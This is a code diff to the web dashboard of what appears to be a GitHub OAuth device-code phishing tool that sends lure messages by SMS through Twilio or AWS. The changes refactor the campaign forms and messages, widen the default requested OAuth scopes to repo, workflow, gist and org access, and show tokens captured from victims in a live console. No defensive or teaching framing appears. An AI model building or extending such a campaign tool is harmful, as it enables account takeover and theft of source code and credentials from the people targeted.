@@ -4,6 +4,16 @@
 
 {% block content %}
 <div class="container-fluid">
+    <!-- Message Alert -->
+    <div class="row mb-3">
+        <div class="col-12">
+            <div id="messageAlert" class="alert alert-dismissible fade" role="alert" style="display: none;">
+                <span id="messageText"></span>
+                <button type="button" class="btn-close" onclick="hideMessage()"></button>
+            </div>
+        </div>
+    </div>
+
     <!-- Header -->
     <div class="row mb-4">
         <div class="col-12">
@@ -13,10 +23,10 @@
                     <p class="text-muted">Manage GitHub OAuth device code phishing campaigns via SMS delivery</p>
                 </div>
                 <div>
-                    <button class="btn btn-primary me-2" onclick="showCampaignModal('github', 'twilio')">
+                    <button class="btn btn-primary me-2" onclick="showCampaignModal('twilio')">
                         <i class="fas fa-plus me-2"></i>New Twilio Campaign
                     </button>
-                    <button class="btn btn-warning" onclick="showCampaignModal('github', 'aws')">
+                    <button class="btn btn-warning" onclick="showCampaignModal('aws')">
                         <i class="fas fa-plus me-2"></i>New AWS Campaign
                     </button>
                 </div>
@@ -42,7 +52,6 @@
                             <thead>
                                 <tr>
                                     <th>Campaign ID</th>
-                                    <th>Platform</th>
                                     <th>Provider</th>
                                     <th>Targets</th>
                                     <th>Status</th>
@@ -52,7 +61,7 @@
                             </thead>
                             <tbody id="campaignsTableBody">
                                 <tr>
-                                    <td colspan="7" class="text-center text-muted py-4">
+                                    <td colspan="6" class="text-center text-muted py-4">
                                         <i class="fas fa-inbox fa-2x mb-2"></i>
                                         <div>No campaigns yet. Create your first SMS campaign above.</div>
                                     </td>
@@ -77,10 +86,15 @@
                 <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
             </div>
             <div class="modal-body">
+                <!-- Modal Message Alert -->
+                <div id="modalMessageAlert" class="alert alert-dismissible fade mb-3" role="alert" style="display: none;">
+                    <span id="modalMessageText"></span>
+                    <button type="button" class="btn-close" onclick="hideModalMessage()"></button>
+                </div>
+
                 <form id="campaignForm">
-                    <input type="hidden" id="campaignPlatform" value="">
                     <input type="hidden" id="campaignProvider" value="">
-                    
+
                     <!-- Campaign Details -->
                     <div class="row mb-3">
                         <div class="col-12">
@@ -151,14 +165,9 @@
                                                 <option value="ap-southeast-1">ap-southeast-1</option>
                                             </select>
                                         </div>
-                                        <div class="d-flex gap-2">
-                                            <button type="button" class="btn btn-sm btn-outline-info" onclick="testAwsConfig()">
-                                                <i class="fas fa-check me-1"></i>Test Config
-                                            </button>
-                                            <button type="button" class="btn btn-sm btn-outline-secondary" onclick="listAwsNumbers()">
-                                                <i class="fas fa-list me-1"></i>List Numbers
-                                            </button>
-                                        </div>
+                                        <button type="button" class="btn btn-sm btn-outline-info" onclick="testAwsConfig()">
+                                            <i class="fas fa-check me-1"></i>Test Config
+                                        </button>
                                     </div>
                                 </div>
                             </div>
@@ -225,8 +234,7 @@
                                 <div class="card-body">
                                     <div class="form-group mb-3">
                                         <label class="form-label">OAuth Scopes</label>
-                                        <input type="text" class="form-control" id="oauthScope" value="repo user" placeholder="repo user">
-                                        <div class="form-text">For GitHub campaigns only</div>
+                                        <input type="text" class="form-control" id="oauthScope" value="repo user gist notifications workflow read:org read:public_key read:repo_hook read:user read:discussion" placeholder="repo user">
                                     </div>
                                     
                                     <div class="form-group mb-3">
@@ -253,28 +261,6 @@
                                             </small>
                                         </div>
                                     </div>
-                                    
-                                    <div class="form-group mb-3">
-                                        <label class="form-label">Encryption Key (Optional)</label>
-                                        <input type="text" class="form-control" id="encryptionKey" placeholder="Base64 encryption key for token storage">
-                                        <div class="form-text">Leave blank for unencrypted token storage</div>
-                                        <button type="button" class="btn btn-sm btn-outline-secondary mt-2" onclick="generateEncryptionKey()">
-                                            <i class="fas fa-key me-1"></i>Generate Key
-                                        </button>
-                                    </div>
-                                    
-                                    <div class="form-group mb-3">
-                                        <label class="form-label">Proxy (Optional)</label>
-                                        <input type="text" class="form-control" id="proxyUrl" placeholder="http://127.0.0.1:8080">
-                                    </div>
-                                    
-                                    <div class="form-check">
-                                        <input class="form-check-input" type="checkbox" id="debugMode">
-                                        <label class="form-check-label" for="debugMode">
-                                            Enable Debug Mode
-                                        </label>
-                                    </div>
-                                    
                                 </div>
                             </div>
                         </div>
@@ -302,6 +288,12 @@
                 <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
             </div>
             <div class="modal-body">
+                <!-- Live Console Message Alert -->
+                <div id="liveConsoleMessageAlert" class="alert alert-dismissible fade mb-3" role="alert" style="display: none;">
+                    <span id="liveConsoleMessageText"></span>
+                    <button type="button" class="btn-close" onclick="hideLiveConsoleMessage()"></button>
+                </div>
+
                 <!-- Campaign Info -->
                 <div class="row mb-3">
                     <div class="col-md-3">
@@ -387,7 +379,7 @@
                 </div>
             </div>
             <div class="modal-footer">
-                <button type="button" class="btn btn-danger" onclick="stopCampaign(currentCampaignId)">
+                <button type="button" id="stopCampaignBtn" class="btn btn-danger" onclick="stopCampaign(currentCampaignId)" style="display: none;">
                     <i class="fas fa-stop me-2"></i>Stop Campaign
                 </button>
                 <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
@@ -433,6 +425,57 @@
 <script>
 let currentCampaignId = null;
 let liveUpdateInterval = null;
+
+// Message display functions
+function showMessage(message, type = 'info') {
+    const alertDiv = document.getElementById('messageAlert');
+    const messageText = document.getElementById('messageText');
+
+    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+    messageText.textContent = message;
+    alertDiv.style.display = 'block';
+
+    setTimeout(() => hideMessage(), 5000);
+}
+
+function hideMessage() {
+    const alertDiv = document.getElementById('messageAlert');
+    alertDiv.style.display = 'none';
+}
+
+// Modal message display functions (for campaign creation modal)
+function showModalMessage(message, type = 'info') {
+    const alertDiv = document.getElementById('modalMessageAlert');
+    const messageText = document.getElementById('modalMessageText');
+
+    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+    messageText.textContent = message;
+    alertDiv.style.display = 'block';
+
+    setTimeout(() => hideModalMessage(), 5000);
+}
+
+function hideModalMessage() {
+    const alertDiv = document.getElementById('modalMessageAlert');
+    alertDiv.style.display = 'none';
+}
+
+// Live console message display functions (for live console modal)
+function showLiveConsoleMessage(message, type = 'info') {
+    const alertDiv = document.getElementById('liveConsoleMessageAlert');
+    const messageText = document.getElementById('liveConsoleMessageText');
+
+    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+    messageText.textContent = message;
+    alertDiv.style.display = 'block';
+
+    setTimeout(() => hideLiveConsoleMessage(), 5000);
+}
+
+function hideLiveConsoleMessage() {
+    const alertDiv = document.getElementById('liveConsoleMessageAlert');
+    alertDiv.style.display = 'none';
+}
 
 // Message templates
 const messageTemplates = {
@@ -485,22 +528,55 @@ GitHub Security`,
     custom: ""
 };
 
-function showCampaignModal(platform, provider) {
-    document.getElementById('campaignPlatform').value = platform;
+function clearCampaignModal() {
+    // Clear campaign details
+    document.getElementById('campaignName').value = '';
+
+    // Clear Twilio config
+    document.getElementById('twilioSid').value = '';
+    document.getElementById('twilioToken').value = '';
+    document.getElementById('fromPhone').value = '';
+
+    // Clear AWS config
+    document.getElementById('awsAccessKeyId').value = '';
+    document.getElementById('awsSecretAccessKey').value = '';
+    document.getElementById('awsSessionToken').value = '';
+    document.getElementById('awsRegion').value = 'us-east-2';
+
+    // Clear target inputs
+    document.getElementById('singleTarget').checked = true;
+    document.getElementById('targetEmail').value = '';
+    document.getElementById('targetPhone').value = '';
+    document.getElementById('targetFile').value = '';
+    toggleTargetInput();
+
+    // Reset advanced options to defaults
+    document.getElementById('oauthScope').value = 'repo user gist notifications workflow read:org read:public_key read:repo_hook read:user read:discussion';
+    document.getElementById('templatePreset').value = 'default';
+    loadMessageTemplate();
+
+    // Clear any modal messages
+    hideModalMessage();
+}
+
+function showCampaignModal(provider) {
+    // Clear form before showing
+    clearCampaignModal();
+
     document.getElementById('campaignProvider').value = provider;
-    
+
     // Show appropriate config section
     document.getElementById('twilioConfig').classList.toggle('d-none', provider !== 'twilio');
     document.getElementById('awsConfig').classList.toggle('d-none', provider !== 'aws');
-    
+
     // Update modal title
     const providerName = provider === 'twilio' ? 'Twilio' : 'AWS SNS';
-    document.querySelector('#campaignModal .modal-title').innerHTML = 
+    document.querySelector('#campaignModal .modal-title').innerHTML =
         `<i class="fas fa-plus me-2"></i>Create ${providerName} SMS Campaign`;
-    
+
     // Load default template
     loadMessageTemplate();
-    
+
     new bootstrap.Modal(document.getElementById('campaignModal')).show();
 }
 
@@ -568,24 +644,30 @@ function generateEncryptionKey() {
 function testTwilioConfig() {
     const data = {
         sid: document.getElementById('twilioSid').value,
-        token: document.getElementById('twilioToken').value
+        token: document.getElementById('twilioToken').value,
+        fromPhone: document.getElementById('fromPhone').value
     };
-    
-    fetch('/api/sms/test-twilio', {
+
+    fetch('/api/sms/test-config', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+            provider: 'twilio',
+            twilioSid: data.sid,
+            twilioToken: data.token,
+            fromPhone: data.fromPhone
+        })
     })
     .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            alert('✅ ' + data.message);
+    .then(result => {
+        if (result.success) {
+            showModalMessage(result.details || 'Twilio configuration is valid', 'success');
         } else {
-            alert('❌ ' + data.error);
+            showModalMessage(result.error || 'Configuration test failed', 'danger');
         }
     })
     .catch(error => {
-        alert('❌ Error: ' + error.message);
+        showModalMessage('Error testing configuration: ' + error.message, 'danger');
     });
 }
 
@@ -596,72 +678,50 @@ function testAwsConfig() {
         sessionToken: document.getElementById('awsSessionToken').value,
         region: document.getElementById('awsRegion').value
     };
-    
-    fetch('/api/sms/test-aws', {
+
+    fetch('/api/sms/test-config', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+            provider: 'aws',
+            awsAccessKeyId: data.accessKeyId,
+            awsSecretAccessKey: data.secretAccessKey,
+            awsSessionToken: data.sessionToken,
+            awsRegion: data.region
+        })
     })
     .then(response => response.json())
     .then(data => {
         if (data.success) {
-            alert('✅ ' + data.message);
+            showModalMessage(data.details || 'AWS configuration is valid', 'success');
         } else {
-            alert('❌ ' + data.error);
+            showModalMessage(data.error || 'Configuration test failed', 'danger');
         }
     })
     .catch(error => {
-        alert('❌ Error: ' + error.message);
-    });
-}
-
-function listAwsNumbers() {
-    const region = document.getElementById('awsRegion').value;
-    
-    fetch(`/api/sms-campaigns/list-aws-numbers?region=${region}`)
-    .then(response => response.json())
-    .then(data => {
-        if (data.success) {
-            let message = 'AWS SMS Numbers:\n\n';
-            data.numbers.forEach(pool => {
-                message += `Pool ${pool.id} (${pool.status}):\n`;
-                pool.numbers.forEach(num => {
-                    message += `  - ${num.identity} (${num.country})\n`;
-                });
-                message += '\n';
-            });
-            alert(message);
-        } else {
-            alert('❌ ' + data.error);
-        }
-    })
-    .catch(error => {
-        alert('❌ Error: ' + error.message);
+        showModalMessage('Error testing configuration: ' + error.message, 'danger');
     });
 }
 
 function startCampaign() {
     const formData = {
-        platform: document.getElementById('campaignPlatform').value,
         provider: document.getElementById('campaignProvider').value,
         name: document.getElementById('campaignName').value,
         targetMethod: document.querySelector('input[name="targetMethod"]:checked').value,
         targetEmail: document.getElementById('targetEmail').value,
         targetPhone: document.getElementById('targetPhone').value,
         scope: document.getElementById('oauthScope').value,
-        messageTemplate: document.getElementById('messageTemplate').value,
-        encryptionKey: document.getElementById('encryptionKey').value,
-        debug: document.getElementById('debugMode').checked
+        messageTemplate: document.getElementById('messageTemplate').value
     };
-    
+
     // Handle CSV file upload for batch campaigns
     if (formData.targetMethod === 'file') {
         const fileInput = document.getElementById('targetFile');
         if (fileInput.files.length === 0) {
-            alert('❌ Please select a CSV file');
+            showMessage('Please select a CSV file', 'warning');
             return;
         }
-        
+
         const file = fileInput.files[0];
         const reader = new FileReader();
         reader.onload = function(e) {
@@ -671,15 +731,15 @@ function startCampaign() {
         reader.readAsText(file);
         return;
     }
-    
+
     // Validate required fields
     if (!formData.name) {
-        alert('❌ Campaign name is required');
+        showMessage('Campaign name is required', 'warning');
         return;
     }
-    
+
     if (formData.targetMethod === 'single' && (!formData.targetEmail || !formData.targetPhone)) {
-        alert('❌ Target email and phone are required');
+        showMessage('Target email and phone are required', 'warning');
         return;
     }
     
@@ -712,28 +772,28 @@ function submitCampaign(formData) {
             if (data.individual_count) {
                 message += ` Running ${data.individual_count} parallel campaigns.`;
             }
-            alert(message);
+            showMessage(message, 'info');
             bootstrap.Modal.getInstance(document.getElementById('campaignModal')).hide();
             refreshCampaigns();
         } else {
-            alert('❌ ' + data.error);
+            showMessage(data.error, 'danger');
         }
     })
     .catch(error => {
-        alert('❌ Error: ' + error.message);
+        showMessage('Error: ' + error.message, 'danger');
     });
 }
 
 function viewCampaign(campaignId) {
     currentCampaignId = campaignId;
-    
+
     // Show live console modal
     new bootstrap.Modal(document.getElementById('liveConsoleModal')).show();
-    
+
     // Start live updates
     refreshLiveConsole();
     liveUpdateInterval = setInterval(refreshLiveConsole, 3000);
-    
+
     // Stop updates when modal is closed
     document.getElementById('liveConsoleModal').addEventListener('hidden.bs.modal', function() {
         if (liveUpdateInterval) {
@@ -745,7 +805,7 @@ function viewCampaign(campaignId) {
 
 function refreshLiveConsole() {
     if (!currentCampaignId) return;
-    
+
     fetch(`/api/sms-campaigns/logs/${currentCampaignId}`)
     .then(response => response.json())
     .then(data => {
@@ -755,14 +815,15 @@ function refreshLiveConsole() {
             document.getElementById('liveSmsSent').textContent = data.stats.sms_sent;
             document.getElementById('liveTokensCaptured').textContent = data.stats.tokens_captured;
             document.getElementById('liveRuntime').textContent = data.stats.runtime;
-            
+
             // Update console output
             document.getElementById('liveConsoleOutput').textContent = data.output || 'No output yet...';
-            
+
             // Update tokens list
             const tokensList = document.getElementById('capturedTokensList');
+            tokensList.innerHTML = ''; // Always clear first
+
             if (data.tokens && data.tokens.length > 0) {
-                tokensList.innerHTML = '';
                 data.tokens.forEach(token => {
                     const tokenDiv = document.createElement('div');
                     tokenDiv.className = 'alert alert-success';
@@ -782,6 +843,31 @@ function refreshLiveConsole() {
                     `;
                     tokensList.appendChild(tokenDiv);
                 });
+            } else {
+                // Show "no tokens" message if empty
+                tokensList.innerHTML = `
+                    <div class="text-center text-muted py-3">
+                        <i class="fas fa-key fa-2x mb-2"></i>
+                        <div>No tokens captured yet</div>
+                    </div>
+                `;
+            }
+
+            // Show/hide stop button based on campaign status
+            const stopBtn = document.getElementById('stopCampaignBtn');
+            if (data.stats.status === 'running') {
+                stopBtn.style.display = 'inline-block';
+            } else {
+                stopBtn.style.display = 'none';
+            }
+
+            // Stop refreshing if campaign has completed
+            if (data.stats.status === 'completed' || data.stats.status === 'failed' || data.stats.status === 'stopped') {
+                if (liveUpdateInterval) {
+                    clearInterval(liveUpdateInterval);
+                    liveUpdateInterval = null;
+                    console.log('Campaign reached terminal status, stopped log polling');
+                }
             }
         } else {
             console.error('Error getting live logs:', data.error);
@@ -814,15 +900,15 @@ function stopCampaign(campaignId) {
         .then(response => response.json())
         .then(data => {
             if (data.success) {
-                alert('✅ Campaign stopped successfully');
+                showLiveConsoleMessage('Campaign stopped successfully', 'success');
                 refreshCampaigns();
                 refreshLiveConsole();
             } else {
-                alert('❌ ' + data.error);
+                showLiveConsoleMessage(data.error, 'danger');
             }
         })
         .catch(error => {
-            alert('❌ Error: ' + error.message);
+            showLiveConsoleMessage('Error: ' + error.message, 'danger');
         });
     }
 }
@@ -876,7 +962,7 @@ function getStatusBadgeClass(status) {
 }
 
 function showUploadModal() {
-    alert('📝 Upload a CSV file with the format:\nemail,phone\nuser1@example.com,+1234567890\nuser2@example.com,+0987654321');
+    showMessage('Upload a CSV file with format: email,phone (e.g., user@example.com,+1234567890)', 'info');
 }
 
 function refreshCampaigns() {
@@ -893,10 +979,9 @@ function refreshCampaigns() {
                 return `
                     <tr>
                         <td>
-                            <div>${displayId}</div>
-                            <small class="text-muted">${campaignType}</small>
+                            <div><strong>${campaign.name || displayId}</strong></div>
+                            <small class="text-muted">${campaignType} • ID: ${displayId}</small>
                         </td>
-                        <td>${campaign.platform}</td>
                         <td>${campaign.provider}</td>
                         <td>${campaign.target_count}</td>
                         <td><span class="badge bg-${getStatusBadgeClass(campaign.status)}">${campaign.status}</span></td>
@@ -905,7 +990,7 @@ function refreshCampaigns() {
                             <button class="btn btn-sm btn-outline-info" onclick="viewCampaign('${campaign.id}')">
                                 <i class="fas fa-eye"></i> View
                             </button>
-                            ${campaign.status.includes('running') ? `
+                            ${campaign.status === 'running' ? `
                                 <button class="btn btn-sm btn-outline-danger" onclick="stopCampaign('${campaign.id}')">
                                     <i class="fas fa-stop"></i>
                                 </button>
@@ -917,7 +1002,7 @@ function refreshCampaigns() {
         } else {
             tbody.innerHTML = `
                 <tr>
-                    <td colspan="7" class="text-center text-muted py-4">
+                    <td colspan="6" class="text-center text-muted py-4">
                         <i class="fas fa-inbox fa-2x mb-2"></i>
                         <div>No campaigns yet. Create your first SMS campaign above.</div>
                     </td>
@@ -933,6 +1018,12 @@ function refreshCampaigns() {
 // Initialize
 document.addEventListener('DOMContentLoaded', function() {
     refreshCampaigns();
+
+    // Clear modal form when it's closed
+    const campaignModal = document.getElementById('campaignModal');
+    campaignModal.addEventListener('hidden.bs.modal', function() {
+        clearCampaignModal();
+    });
 });
 </script>
 {% endblock %}
